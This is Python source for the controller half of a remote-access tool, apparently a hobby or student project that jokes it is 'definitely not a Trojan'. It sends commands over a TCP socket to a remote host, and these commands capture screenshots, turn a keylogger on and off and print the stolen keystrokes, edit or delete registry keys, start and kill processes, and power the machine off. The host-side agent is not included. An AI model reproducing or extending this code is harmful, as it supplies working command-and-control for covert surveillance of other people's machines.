import socket
from PIL import Image
import io

HEADER = 64
PORT = 5050
SERVER = ""
FORMAT = 'utf-8'
DISCONNECT_MSG = "!DISCONNECT"
SCREENSHOT_MSG = "!SCREENSHOT"
SHUTDOWN_MSG = "!SHUTDOWN"
KEYLOG_MSG = "!KEYLOG"
GETAPP_MSG = "!GETAPP"
KILLAPP_MSG = "!KILLAPP"
REGISTRY_MSG = "!REGISTRY"
PROCESS_MSG = "!PROCESS"

def manual():
    print('\n---------MANUAL FOR TESTING---------')
    print('!DISCONNECT: Disconnect from host\n')
    print('!SCREENSHOT: Request screenshot from host\n')
    print('!SHUTDOWN: Power off host machine (?!!)\n')
    print('!KEYLOG: Activate keylogger on host machine\n\t+ This command will activate keylogger if used once and deactivate if used twice, the result will then be printed on the client side\n')
    print('!GETAPP: Get the list of currently running application on the host\'s machine\n')
    print('!KILLAPP: Kill an app with its ID if it is running\n')
    print('!REGISTRY: Perform various super suspicious actions on the registry of the host\'s machine (The datatype of Values are set to REG_SZ, which is a string)')
    print('\t+ GETVAL,[path],[name] - Get content of [name] in [path] \n\t+ SETVAL,[path],[name],,[data] - Set content of [name] in [path] to [data]')
    print('\t+ CREATEVAL,[path],[name],,[data] - Create a new value, named [name] in [path] with the content [data]\n\t+ DELETEVAL,[path],[name] - Delete value [name] in [path]')
    print('\t+ CREATEKEY,[path],[name] - Create a new key, named [name] in [path] \n\t+ DELETEKEY,[path],[name] - Delete key [name] in [path]\n')
    print('!PROCESS: Perform actions on the Process feature of the host\'s machine')
    print('\t+ GETPROCESS - Get the list of currently running processes on the host\'s machine')
    print('\t+ STARTPROCESS,[name/path] - Start a new process with [name] or [path]\n\t+ KILLPROCESS,[pid] - Kill a process with [pid]')
    print('-------------------------------------------')
    print('**This godforsaken program is definitely not a Trojan and will not break anyone\'s machine in any possible way, 100% safe for kids and Weebs\n')

keylog_on = False

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


def send(msg):
    message = msg.encode(FORMAT)
    msg_len = str(len(message)).encode(FORMAT) 
    msg_len += (b' '*(HEADER - len(msg_len)))
    client.send(msg_len)
    client.send(message)

def receive_screenshot():
    length = int(client.recv(HEADER).decode(FORMAT))
    screenshot_bytes = b''
    while length > 0:
        data = client.recv(min(length, 4096))
        if not data:
            break
        screenshot_bytes += data
        length -= len(data)
    return screenshot_bytes

def display_screenshot(image_bytes):
    if not image_bytes:
        print("Error: No screenshot data received.")
        return
    image_streamIO = io.BytesIO(image_bytes)
    image_streamIO.seek(0)
    image = Image.open(image_streamIO)
    image.show()

def receive():
    msg_len = client.recv(HEADER).decode(FORMAT)
    if msg_len:
        msg_len = int(msg_len)
        msg = client.recv(msg_len).decode(FORMAT)
        return msg
    return ""

def receiveAppList():
    appList_len = int(receive())
    applist = []
    for i in range(appList_len):
        item = []
        for j in range(4):
            item.append(receive())
        applist.append({"description": item[0], "app_id": item[1], "path": (item[2]), "thread": item[3]})
    for item in applist:
        print(item)

def receiveProcessList():
    process_list_len = int(receive())
    process_list = []
    for i in range(process_list_len):
        item = []
        for j in range(3):
            item.append(receive())
        process_list.append({"pid": item[0], "name": item[1], "thread": (item[2])})
    for item in process_list:
        print(item)

def start():
    while True:
        msg = input("Enter a message or --help for manual: ")
        global keylog_on
        send(msg)
        if msg == '--help':
            manual()
        if msg == DISCONNECT_MSG or msg == SHUTDOWN_MSG:
            break           
        elif msg == SCREENSHOT_MSG:
            screenshot_data = receive_screenshot()
            display_screenshot(screenshot_data)
        elif msg == KEYLOG_MSG:
            if not keylog_on:
                keylog_on = True
            else:
                keylog_on = False
                print(f"Keylog: {receive()}")
        elif msg == REGISTRY_MSG:
            send(input("Enter command: "))
            print(receive())
        elif msg == GETAPP_MSG:
            receiveAppList()
        elif msg == PROCESS_MSG:
            command = input("Enter command: ")
            send(command)
            if (command.find("GETPROCESS") != -1):
                receiveProcessList()
            else:
                print(receive())
        elif msg == KILLAPP_MSG:
            app_id = input("Enter app ID to kill: ")
            send(app_id)
            print(receive())

def connect(address):
    try:
        client.connect((address, PORT))
        return True
    except:
        print(f'Cannot connect to server {address}\n')
        return False

def tryConnect(ip):
    while True:
        if connect(ip):
            break
           
# while True:
#     while True:
#         SERVER = input('Enter host IP: ')
#         if connect(SERVER):
#             break
#     if SERVER == 'exit':
#         break
#     start()
#     print(f'Disconnected from host {SERVER}\n')
#     client.close()
#     client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

client.close()